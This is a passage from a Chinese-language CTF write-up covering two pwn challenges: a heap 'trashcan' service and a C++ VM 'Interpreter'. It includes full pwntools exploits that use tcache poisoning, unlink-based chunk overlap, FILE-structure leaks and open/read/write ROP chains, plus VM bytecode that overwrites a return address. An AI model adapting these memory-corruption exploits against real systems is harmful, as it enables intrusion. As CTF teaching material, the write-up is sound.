iofile += p64(0)*3 + p64(stack) + p64(stack+0x20)*3 + p64(stack+0x21) + p64(0)
choice(1)
io.sendlineafter("Trashcan no.:", str(14))
io.sendlineafter("Size of your trash:", str(0x50))
io.sendline(iofile)

io.recv(1)
target = u64(io.recv(6) + b'\x00\x00')-0x100
print(hex(target))



add(0, 0x30-8, 'a\n')
add(1, 0x50-8, 'b\n')

add(2, 0x1f8, 'c\n')
add(0x1f, 0x18, 'b\n')
# for i in range(4):
#     add(3+i, 0x2f8, 'xd\n') # 3->9
for i in range(7):
    change_size(3+i, 0x2f8) # 3->9 fill 0x300 tcache


add(0x1f, 0x50-8, '\n')
change_size(0x1f, 0x3f8)


change_size(0, 0x3f8)
fd = 0x555555572740 - 0x55555556feb0 + heap_addr +0x20 
bk = 0x555555572740 - 0x55555556feb0 + heap_addr +0x20
p_to_chunk = 0x555555572740 - 0x55555556feb0 + heap_addr
add(0, 0x20, b'\x00'*8 + p64(0x71) + p64(fd) + p64(bk))
change_size(1, 0x3f8)

# gdb.attach(io, debug)
add(1, 0x50-8, p64(p_to_chunk)*2 + b'a'*0x30 + p64(0x70))


change_size(2, 0x400)

change_size(1, 0x3f8)


add(3, 0x70-8, b'\x00'*0x18 + p64(0x51) + p64(target)*2 + b'\n')
add(0x1f, 0x48, '\n')

prdir = libc.address+0x0000000000026b72
prsir = libc.address+0x0000000000027529
prdxr = libc.address+0x0000000000162866 # pop rdx ; pop rbx ; ret
prspr = libc.address+0x0000000000032b5a
syscall = libc.address+0x0000000000066229 # syscall ; ret
praxr = libc.address+0x000000000004a550
flag_addr = heap_addr + 0x1000
read_addr = libc.sym['read']
open_addr = libc.sym['open'] # open64 is not permitted
write_addr = libc.sym['write']
str_addr = 0x5555555727c0 - 0x55555556feb0 + heap_addr
addr = 0x5555555717d0 - 0x55555556feb0 + heap_addr

rop = flat(prspr, addr) 
add(0x1f, 0x48, rop + b'\n') 

rop2 = flat(prdir, str_addr, praxr, 2, syscall,
        prdir, 3, prsir, flag_addr, prdxr, 0x40, 0, read_addr,
        prdir, 1, prsir, flag_addr, prdxr, 0x40, 0, write_addr)

add(0x0, 0x1f0, rop2 + b'\n')
add(0x1, 0x18, "./flag.txt\x00\n")
io.sendline("0") 

io.interactive()
```

全场唯一解（2.32）已公布，大体思路一致，但暂时还没明白为什么他需要爆破，没有新版本环境。

```python
from pwn import *

def create(idx,sz,data, ignore=0):
    p.sendlineafter(">","1")
    p.sendlineafter("Trashcan no.:",str(idx))
    p.sendlineafter("Size of your trash:",str(sz))
    if(ignore == 1):
        p.sendline(data)
    else:
        p.sendlineafter("Your trash:",data)

def resize(idx,sz):
    p.sendlineafter(">","2")
    p.sendlineafter("Trashcan no.:",str(idx))
    p.sendlineafter("Size of new trashcan:",str(sz))

def show(idx):
    p.sendlineafter(">","3")
    p.sendlineafter("Trashcan no.:",str(idx))

def mask(heap_base,target):
 return (heap_base >> 0xc ) ^ target

#p = process("./a.out")
p = remote("34.71.103.59",49153)

try:
    p.sendline("31337")
    sleep(1)
    leak = p.recv(256).split()

    heap_leak = int(leak[-18], 16)
    heap_base = heap_leak - 0x11eb0
    chunk_to_overlap = heap_base + 0x128c0
    fd = heap_base + 0x11f38
    bk = heap_base + 0x11f40
    chunk = heap_base + 0x11ee0
    addr = heap_base + 0x10
    mask_ptr1 = heap_base + 0x11f20
    mask_ptr2 = heap_base + 0x11fa0
    ropchain = heap_base + 0x11fd0
    flag = heap_base + 0x11fa0

    log.warning("got heap leak")

    create(0,0xf8,"AAAA")
    create(1,0x1f8,"AAAA")
    create(2,0x1f8,"AAAA")

    for i in xrange(7):
        create(i+3,0xf8,"AAAA")

    for i in xrange(7):
        resize(i+3,0x108)

    resize(0,0x108)

    for i in xrange(7):
        create(i+10,0xf8,"AAAA")

    # prepare fake pointers to create chunk overlapping

    create(0,0xf8,p64(0x0)*3+p64(0xe1)+p64(fd)+p64(bk)+p64(chunk)*2+"A"*0x40+p64(chunk)+"A"*0x68+p64(0xe0))

    for i in xrange(7):
        resize(i+3,0x208)

    # trigger unlink

    resize(1,0x208)

    for i in xrange(7):
        resize(i+10,0x108)

    create(17,0x18,"AAAA")
    create(18,0x2b0,"A"*0xb0+p64(0x0)+p64(0x401))

    resize(0,0x108)

    create(19,0x18,"AAAA")

    for i in xrange(7):
        resize(i+3,0x300)

    show(17)

    sleep(1)
    leak = p.recv().split()
    leak = p.recv(16).split()
    libc_leak = u64(leak[0].ljust(8,"\x00"))
    libc_base = libc_leak - 0x1e3cd0
    stdout = libc_base + 0x1e46c0
    stdin = libc_base + 0x1e39a0
    environ = libc_base + 0x1e7600
    smallbin_data = libc_base + 0x1e3c20
    pop_rax_rdx_rbx = libc_base + 0x1597d5
    pop_rdi = libc_base + 0x2858f
    pop_rsi = libc_base + 0x2ac3f
    pop_rbp = libc_base + 0x266e0
    leave_ret = libc_base + 0x5591c
    syscall_ret = libc_base + 0x611ea

    log.warning("got libc leak")

    create(20,0x28,"A"*0x10+p64(0x0)+p64(0x2c1))

    # do tcache poisioning to get an arb write on stdout

    create(21,0x78,"XXXX")
    create(22,0x78,"AAAA")

    resize(22,0x200)
    resize(21,0x200)

    resize(18,0x300)
    create(18,0x2b0,p64(0x0)+p64(0x81)+p64(mask(mask_ptr1,stdout))+"A"*0x68+p64(0x0)+p64(0x31)+p64(smallbin_data)*2+"A"*0x10+p64(0x30)+p64(0x400))

    create(22,0x78,"AAAA")
    create(23,0x78,p64(0xfbad1800)+p64(0x0)*3+p64(environ)+p64(environ+0x20)*3+p64(environ+0x21)+p64(0x0)*4+p64(stdin)+p64(0x1),1)

    leak = p.recv().split()
    leak = p.recv(40).split()
    stack_leak = u64(leak[0][:6].ljust(8,"\x00"))
    saved_rip = stack_leak - 0x140 - 0x8

    log.warning("got stack leak")
    # do tcache poisioning on a functions saved rip

    log.success("got all leaks")
    log.info("heap base: " + str(hex(heap_base)))
    log.info("libc base: " + str(hex(libc_base)))
    log.info("stack leak: " + str(hex(stack_leak)))

    create(24,0x28,"XXXX")
    create(25,0x28,"AAAA")

    resize(25,0x200)
    resize(24,0x200)

    resize(18,0x300)
    create(18,0x2b0,p64(0x0)+p64(0x81)+"A"*0x70+p64(0x0)+p64(0x31)+p64(mask(mask_ptr2,saved_rip))+"A"*0x20+p64(0x400)+p64(pop_rax_rdx_rbx)+p64(0x2)+p64(0x0)*2+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0x0)+p64(syscall_ret)+p64(pop_rax_rdx_rbx)+p64(0x0)+p64(0x28)+p64(0x0)+p64(pop_rdi)+p64(0x3)+p64(pop_rsi)+p64(flag)+p64(syscall_ret)+p64(pop_rax_rdx_rbx)+p64(0x1)+p64(0x28)+p64(0x0)+p64(pop_rdi)+p64(0x1)+p64(syscall_ret))

    create(26,0x28,"flag.txt\x00")
    create(27,0x28,"AAAAAAAA"+p64(pop_rbp)+p64(ropchain-0x8)+p64(leave_ret))

    leak = p.recv().split()
    leak = p.recv().split()
    log.success("got flag: " + leak[0])
    p.close()

except:
    log.failure("exploit failed")
```

## Interpreter

C++实现的vmpwn，逆指令就完事了。 

```
op reg1 [reg2] [reg3]

opcode  operations

c       ip+=2, 
r       ip+=3, byte v13[reg1] = byte v14[ short v13[reg2] ] 
w       ip+=3, byte v14[ short v13[reg1] ] =  byte v13[reg2]  
a       ip+=4, byte v13[reg1] = byte v13[reg2] + byte v13[reg3]
d       ip+=4, byte v13[reg1] = short v13[reg2] / short v13[reg3]
m       ip+=4, byte v13[reg1] = byte v13[reg2] * byte v13[reg3]
s       ip+=4, byte v13[reg1] = byte v13[reg2] - byte v13[reg3]

```

在解析指令时有明显的逻辑漏洞，本意是只有0-3个寄存器，但是只要不都大于3就不会报错

```c
    opcode = code[currentIP] | 0x20;
    _reg2 = currentIP + 2;
    reg1 = code[currentIP + 1] - 0x30;
    if ( opcode == 'c' )
    {
      currentIP += 2;
    }
    else
    {
      v10 = currentIP + 3;
      reg2 = code[_reg2] - '0';
      if ( opcode != 'r' && opcode != 'w' )
      {
        currentIP += 4;
        reg3 = code[v10] - '0';
      }
      else
      {
        currentIP += 3;
      }
      if ( (unsigned __int8)(code[_reg2] - '0') > 3u && reg1 > 3u && reg3 > 3u )// opcode <=3 <=3 <=3
      {                                         // 逻辑漏洞
        std::operator<<<std::char_traits<char>>(&std::cerr, "Invalid Register\n");
        exit(-1);
      }
    }
```
所以能以v13为base，以任意一字节为offset，进行读写等操作。

```c
__int64 __fastcall main_core(const char *code)
{
  int code_len; // er15
  unsigned __int8 reg3; // r13
  char reg2; // r14
  char v5; // cl
  int currentIP; // ebp
  char opcode; // al
  int _reg2; // esi
  unsigned __int8 reg1; // bl
  int v10; // edi
  int i; // edx
  __int64 v13; // [rsp+8h] [rbp-A0h]
  __int64 v14[7]; // [rsp+10h] [rbp-98h]
  int v15; // [rsp+48h] [rbp-60h]
  char v16[24]; // [rsp+50h] [rbp-58h] BYREF
  unsigned __int64 v17; // [rsp+68h] [rbp-40h]
```

把v14改成3p1cl337-k3yw0rd就能拿到re的flag（flag1.txt）

pwn题要求拿到flag2.txt，在函数sub_2B47()，c++很难辨认，但是还是能依稀看出open了flag2.txt，并且该函数没有被任何函数调用。

```c
unsigned __int64 sub_2B47()
{
  std::ostream *v0; // rbx
  char *v1; // rcx
  _BYTE *v2; // rbp
  char v3; // si
  std::ostream *v4; // rax
  void *v6; // [rsp+0h] [rbp-248h] BYREF
  __int64 v7; // [rsp+8h] [rbp-240h]
  __int64 v8[2]; // [rsp+10h] [rbp-238h] BYREF
  int *v9; // [rsp+20h] [rbp-228h] BYREF
  __int64 v10; // [rsp+28h] [rbp-220h]
  __int64 v11[7]; // [rsp+30h] [rbp-218h] BYREF
  char v12[48]; // [rsp+68h] [rbp-1E0h] BYREF
  char v13[136]; // [rsp+98h] [rbp-1B0h] BYREF
  __int64 v14[28]; // [rsp+120h] [rbp-128h] BYREF
  char v15; // [rsp+200h] [rbp-48h]
  char v16; // [rsp+201h] [rbp-47h]
  __int64 v17; // [rsp+208h] [rbp-40h]
  __int64 v18; // [rsp+210h] [rbp-38h]
  __int64 v19; // [rsp+218h] [rbp-30h]
  __int64 v20; // [rsp+220h] [rbp-28h]
  unsigned __int64 v21; // [rsp+228h] [rbp-20h]

  v21 = __readfsqword(0x28u);
  std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Nice Job\n", 9LL);
  std::ios_base::ios_base((std::ios_base *)v14);
  v14[0] = (__int64)&unk_4C40;
  v14[27] = 0LL;
  v15 = 0;
  v16 = 0;
  v17 = 0LL;
  v18 = 0LL;
  v19 = 0LL;
  v20 = 0LL;
  v9 = &dword_0;
  *(int **)((char *)&v9 + MEMORY[0xFFFFFFFFFFFFFFE8]) = &dword_0;
  v10 = 0LL;
  std::ios::init((char *)&v9 + *((_QWORD *)v9 - 3), 0LL);
  v9 = (int *)&unk_4CE8;
  v14[0] = (__int64)&unk_4CE8 + 40;
  std::filebuf::basic_filebuf(v11);
  std::ios::init(v14, v11);
  if ( std::filebuf::open(v11, "flag2.txt", 8LL) )
    std::ios::clear((char *)&v9 + *((_QWORD *)v9 - 3), 0LL);
  else
    std::ios::clear((char *)&v9 + *((_QWORD *)v9 - 3), *(_DWORD *)((char *)&v9 + *((_QWORD *)v9 - 3) + 32) | 4u);
  v6 = v8;
  v7 = 0LL;
  LOBYTE(v8[0]) = 0;
  std::operator>><char>(&v9, &v6);
  std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Here's your second reward : ", 28LL);
  v0 = (std::ostream *)std::__ostream_insert<char,std::char_traits<char>>(std::cout, v6, v7);
  v1 = (char *)v0 + *(_QWORD *)(*(_QWORD *)v0 - 24LL);
  v2 = (_BYTE *)*((_QWORD *)v1 + 30);
  if ( !v2 )
    std::__throw_bad_cast();
  if ( v2[56] )
  {
    v3 = v2[67];
  }
  else
  {
    std::ctype<char>::_M_widen_init(*((_QWORD *)v1 + 30));
    v3 = (*(__int64 (__fastcall **)(_BYTE *, __int64))(*(_QWORD *)v2 + 48LL))(v2, 10LL);
  }
  v4 = (std::ostream *)std::ostream::put(v0, v3);
  std::ostream::flush(v4);
  if ( v6 != v8 )
    operator delete(v6, v8[0] + 1);
  v9 = (int *)&unk_4CE8;
  v14[0] = (__int64)&unk_4CE8 + 40;
  v11[0] = (__int64)&unk_4D30;
  std::filebuf::close(v11);
  std::__basic_file<char>::~__basic_file(v13);
  v11[0] = (__int64)&unk_4C60;
  std::locale::~locale((std::locale *)v12);
  v9 = &dword_0;
  *(int **)((char *)&v9 + MEMORY[0xFFFFFFFFFFFFFFE8]) = &dword_0;
  v10 = 0LL;
  v14[0] = (__int64)&unk_4C40;
  std::ios_base::~ios_base((std::ios_base *)v14);
  return v21 - __readfsqword(0x28u);
}
```

不管怎么样先执行到这个函数试试吧，考虑直接改返回地址。

改了，发现直接把flag打印出来了。。

```python

""" x1do0 / Lilac """
from pwn import *

io = process("./Interpreter")

def getop(ch):
    return chr(ord(ch) | 0x20)

# 0x555555556b0c -> 6B47

code = ''
code += getop('s') + '000'  # v13[0]=0
code += getop('a') + '040'  # v13[0]=1
for i in range(0x47-0xc):   # v13[0xa8]+=0x47-0xc
    code += getop('a') + '\x80\x800'  

io.sendlineafter("Enter ur Code : ", code)

io.interactive()
```

官方writeup如下，这。。成功率50%我表示不能理解。。

```
Pwn (works at about 50% probability)

00000000  61 30 30 30 61 30 30 30 61 30 30 30 61 30 30 30  |a000a000a000a000|
00000010  61 30 30 30 61 30 30 30 61 30 30 30 61 30 30 30  |a000a000a000a000|
00000020  61 89 30 81 61 8a 30 82 61 8b 30 83 61 35 33 33  |a.0.a.0.a.0.a533|
00000030  61 36 33 33 61 33 33 34 61 35 35 33 61 33 33 33  |a633a334a553a333|
00000040  61 36 36 33 61 33 33 33 61 31 31 33 61 35 35 33  |a663a333a113a553|
00000050  61 36 36 33 61 33 33 33 61 30 30 33 61 31 31 33  |a663a333a003a113|
00000060  61 32 32 33 61 35 35 33 61 36 36 33 61 33 33 33  |a223a553a663a333|
00000070  61 30 30 33 61 31 31 33 61 32 32 33 61 33 33 33  |a003a113a223a333|
00000080  61 31 31 33 61 35 35 33 61 33 33 33 61 31 31 33  |a113a553a333a113|
00000090  61 35 35 33 61 33 33 33 61 33 33 33 61 30 30 33  |a553a333a333a003|
000000a0  61 31 31 33 61 35 35 33 61 36 36 33 61 33 33 33  |a113a553a663a333|
000000b0  61 35 35 33 61 36 36 33 61 33 33 33 61 35 35 33  |a553a663a333a553|
000000c0  61 36 36 33 61 33 33 33 61 33 33 33 61 35 35 33  |a663a333a333a553|
000000d0  61 36 36 33 61 33 33 33 61 36 36 33 61 33 33 33  |a663a333a663a333|
000000e0  61 35 35 33 61 36 36 33 73 33 33 33 73 88 80 30  |a553a663s333s..0|
000000f0  61 30 30 34 73 80 80 30 72 30 31 61 84 30 35 61  |a004s..0r01a.05a|
00000100  8c 30 36 61 31 31 34 72 30 31 61 85 30 32 61 30  |.06a114r01a.02a0|
00000110  30 34 61 8d 30 34 61 31 31 34 72 30 31 61 86 30  |04a.04a114r01a.0|
00000120  33 61 8e 30 33 61 31 31 34 72 30 31 61 87 30 33  |3a.03a114r01a.03|
00000130  61 8f 30 33 63 30 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |a.03c0----------|
00000140  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000150  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000160  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000170  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000180  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000190  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001a0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001b0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001c0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001d0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001e0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001f0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000200  0a                                               |.|
```





